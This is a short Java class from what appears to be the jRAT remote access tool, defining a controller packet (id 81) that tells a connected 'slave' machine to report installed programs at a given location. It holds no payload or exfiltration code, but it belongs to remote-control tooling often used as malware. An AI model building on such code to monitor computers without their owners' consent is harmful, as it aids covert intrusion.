package jrat.module.system.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet81InstalledPrograms implements OutgoingPacket {

	private String location;

	public Packet81InstalledPrograms(String location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(location);
	}

	@Override
	public short getPacketId() {
		return 81;
	}

}
